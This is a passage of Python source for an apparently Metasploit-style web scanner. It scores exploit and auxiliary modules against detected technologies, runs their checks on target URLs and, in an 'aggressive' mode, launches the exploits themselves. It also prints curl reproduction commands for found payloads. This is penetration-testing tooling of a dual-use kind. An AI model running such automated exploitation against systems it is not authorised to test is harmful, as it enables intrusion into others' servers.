                # auxiliary/scanner/http/sql_injection returns True if vulnerable.
                res = module.run()
                if res:
                    vuln_name = mod_path.split('/')[-1].replace('_', ' ').title()
                    self._record_result(
                        url=f"{target}{path}", 
                        attack=vuln_name, 
                        parameter=parameter, 
                        evidence=f"Detected by module execution: {mod_path}", 
                        method=method
                    )
                    return True
            
            return False
        except Exception as e:
            if self.verbose: 
                print_debug(f"Error running generic scanner {mod_path}: {e}")
            return False

    def _test_sqli(self, *args, **kwargs):
        # Deprecated: usage moved to _run_generic_scanner
        return 0

    def _test_xss(self, *args, **kwargs):
        # Deprecated: usage moved to _run_generic_scanner
        return 0

    def _test_rce(self, *args, **kwargs):
        # Deprecated: usage moved to _run_generic_scanner
        return 0

    def _test_lfi(self, *args, **kwargs):
        # Deprecated: usage moved to _run_generic_scanner
        return 0

    def _test_ssrf(self, *args, **kwargs):
        # Deprecated: usage moved to _run_generic_scanner
        return 0

    def _request(self, url, method, params, timeout=None) -> Optional[requests.Response]:
        t = timeout or self.timeout
        try:
            if method == 'POST':
                return self.session.post(url, data=params, timeout=t)
            return self.session.get(url, params=params, timeout=t)
        except:
            return None

    def _find_modules(self, patterns: List[str], url_data: List[Dict]) -> List[Dict]:
        """Smart Module Selection Strategy using tokenized strings"""
        if not self.framework: return []
        
        candidates = []
        
        # 1. Identify signals from passive/active analysis
        vuln_signals = set()
        for u in url_data:
            vuln_signals.update(u.get('signals', []))
        
        # 2. Scan all modules
        all_modules = self._list_all_exploit_modules()
        
        for mod_path in all_modules:
            score = 0
            mod_parts = re.split(r'[^a-zA-Z0-9]', mod_path.lower())
            mod_parts = [p for p in mod_parts if len(p) > 2]
            mod_lower = mod_path.lower()
            
            # Base score if matches user pattern
            if 'all' in patterns:
                score += 1
            elif any(pat in mod_lower for pat in patterns):
                score += 20
            
            if score == 0: continue
            
            # Technology Boost (using tokens)
            # e.g. if mod_path is 'exploits/linux/http/apache_rce' and tech_tokens has 'apache'
            for tech in self.tech_tokens:
                if tech in mod_parts or tech in mod_lower:
                    score += 30 # Significant match
            
            # Vulnerability Type Boost
            for signal in vuln_signals:
                if signal in mod_parts or signal in mod_lower:
                    score += 25
            
            # Context boost (HTTP modules have priority for web scan)
            if 'http' in mod_lower:
                score += 10

            if score > 10:
                candidates.append({'path': mod_path, 'score': score})
                
        # Sort
        candidates.sort(key=lambda x: x['score'], reverse=True)
        return candidates[:50] # Return top 50 matches

    def _list_all_exploit_modules(self) -> List[str]:
        """Traverse filesystem to find modules"""
        modules = []
        # Support both 'exploits' and 'auxiliary'
        module_types = ['exploits', 'auxiliary']
        
        for m_type in module_types:
            base_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'modules', m_type)
            if not os.path.exists(base_dir): continue
            
            for root, _, files in os.walk(base_dir):
                for file in files:
                    if file.endswith('.py') and not file.startswith('__'):
                        # Calculate relative path from 'modules/'
                        full_path = os.path.join(root, file)
                        modules_root = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'modules')
                        rel = os.path.relpath(full_path, modules_root)
                        mod_name = rel.replace('\\', '/').replace('.py', '')
                        modules.append(mod_name)
        return modules

    def _test_vulnerabilities(self, url_data, modules, threads):
        """Run selected modules against targets"""
        # Group modules by relevance to avoid spamming every URL with every module
        tasks = []
        
        # Limit to top scoring modules to keep it efficient
        top_modules = modules[:20]
        
        for mod in top_modules:
            mod_path = mod['path']
            # Only test modules that aren't the ones we already used in _test_url_entry
            if 'scanner/http/' in mod_path: continue
            
            for url_entry in url_data:
                # check relevance
                if not self._is_module_relevant(mod_path, url_entry):
                    continue
                
                tasks.append((mod_path, url_entry))
        
        if not tasks:
            return

        print_info(f"Generated {len(tasks)} exploit/auxiliary tasks.")
        
        # Parallel execution logic
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self._run_single_module, mod_path, url_entry) for mod_path, url_entry in tasks]
            for future in as_completed(futures):
                pass

    def _is_module_relevant(self, mod_path: str, url_entry: Dict) -> bool:
        """Check if module is relevant for URL"""
        mp = mod_path.lower()
        u = url_entry['url'].lower()
        
        # Tech heuristics
        techs = [t.lower() for t in self.technologies.keys()]
        
        # If tech is known, filter modules by tech
        if techs:
            # If module name contains a tech that is NOT in the target's techs, return False
            known_tech_keywords = ['wordpress', 'joomla', 'drupal', 'laravel', 'django', 'php', 'tomcat', 'nginx', 'apache', 'iis']
            for tech in known_tech_keywords:
                if tech in mp and tech not in techs:
                    return False

        # Pattern heuristics
        if 'wordpress' in mp and 'wp-' not in u: return False
        if 'joomla' in mp and 'com_content' not in u: return False
        
        return True

    def _run_single_module(self, mod_path, url_entry):
        try:
            # Load module
            module = self.framework.module_loader.load_module(mod_path, framework=self.framework)
            if not module: return
            
            parsed = urlparse(url_entry['url'])
            # Configure
            self._set_vals(module, 'RHOSTS', parsed.hostname)
            self._set_vals(module, 'RPORT', parsed.port or (443 if parsed.scheme=='https' else 80))
            self._set_vals(module, 'SSL', parsed.scheme=='https')
            self._set_vals(module, 'TARGETURI', parsed.path or '/')
            
            # Some modules use 'TARGET' or 'RHOST'
            self._set_vals(module, 'TARGET', f"{parsed.scheme}://{parsed.netloc}")
            self._set_vals(module, 'RHOST', parsed.hostname)

            # Check
            if hasattr(module, 'check'):
                res = module.check()
                if self._check_is_vuln(res):
                    self._record_result(url=url_entry['url'], module=mod_path, status="Vulnerable (Check)", message=str(res))
                    # Exploit?
                    if self.aggressive and hasattr(module, 'run'):
                        module.run()
            elif hasattr(module, 'run'):
                # Modules with only run() are more dangerous to run blindly
                # only run if aggressive or if score was very high
                if self.aggressive:
                    module.run()
        except:
            pass

    def _set_vals(self, mod, opt, val):
        """Safely set option values on a module"""
        if hasattr(mod, opt):
            try:
                # Try setting the .value property (for OptString, etc.)
                opt_obj = getattr(mod, opt)
                if hasattr(opt_obj, 'value'):
                    opt_obj.value = val
                else:
                    # Fallback for descriptors or simple attributes
                    setattr(mod, opt, val)
            except:
                # Final fallback
                setattr(mod, opt, val)

    def _check_is_vuln(self, res):
        if isinstance(res, bool): return res
        if isinstance(res, dict): return res.get('vulnerable', False)
        if hasattr(res, 'vulnerable'): return res.vulnerable
        return False

    def _flatten_params(self, params):
        return {k: v[0] if isinstance(v, list) and v else v for k, v in params.items()}

    def _clean_url(self, url):
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}{p.path}"

    def _get_page(self, url):
        return self._get_page_cached(url)

    def _get_page_cached(self, url):
        with self.cache_lock:
            if url in self.page_cache: return self.page_cache[url]
        try:
            r = self.session.get(url, timeout=self.timeout, verify=False)
            ret = {'status_code': r.status_code, 'text': r.text, 'headers': r.headers}
            with self.cache_lock: self.page_cache[url] = ret
            return ret
        except:
            return None

    def _get_cached_soup(self, url, text):
        return BeautifulSoup(text, 'html.parser')

    def _record_result(self, **kwargs):
        kwargs['timestamp'] = time.time()
        with self.results_lock:
            self.results.append(kwargs)
        # Real-time output
        if kwargs.get('module'):
            print_success(f"[VULN] {kwargs.get('module')} - {kwargs.get('url')}")
        else:
            print_success(f"[VULN] {kwargs.get('attack')} - {kwargs.get('parameter')} on {kwargs.get('url')}")

    def _display_results(self):
        if not self.results:
            print_warning("No vulnerabilities found.")
            return
        
        print_success("--- SCAN RESULTS ---")
        for res in self.results:
            if 'module' in res:
                print_info(f"Module: {res['module']}")
                print_info(f"Target: {res['url']}")
                print_info(f"Status: {res.get('status', 'Detected')}")
                if 'message' in res: print_info(f"Details: {res['message']}")
            else:
                print_info(f"Type: {res['attack']}")
                print_info(f"URL: {res['url']}")
                print_info(f"Param: {res['parameter']}")
                print_info(f"Evidence: {res['evidence']}")
                if 'payload' in res:
                    print_info(f"Payload: {res['payload']}")
                    # Generate Repro
                    cmd = f"curl -i -s"
                    if res.get('method') == 'POST':
                        cmd += f" -X POST -d \"{res['parameter']}={res['payload']}\""
                    else:
                        sep = '&' if '?' in res['url'] else '?'
                        cmd += f" \"{res['url']}{sep}{res['parameter']}={urllib.parse.quote(res['payload'])}\""
                    print_info(f"Reproduction: {cmd}")
            print_info("-" * 30)

from itertools import chain

